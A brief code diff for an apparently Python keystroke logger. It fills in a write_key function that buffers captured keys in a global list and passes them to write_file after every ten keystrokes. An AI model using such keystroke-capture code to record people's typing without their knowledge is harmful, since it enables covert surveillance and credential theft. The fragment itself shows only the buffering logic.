@@ -14,7 +14,13 @@ def on_release(key):
 
 
 def write_key(key):
-    pass
+    global keys, count
+    keys.append(key)
+    count += 1
+    if count >= 10:
+        write_file(keys)
+        keys = []
+        count = 0
 
 
 def write_file(keys):
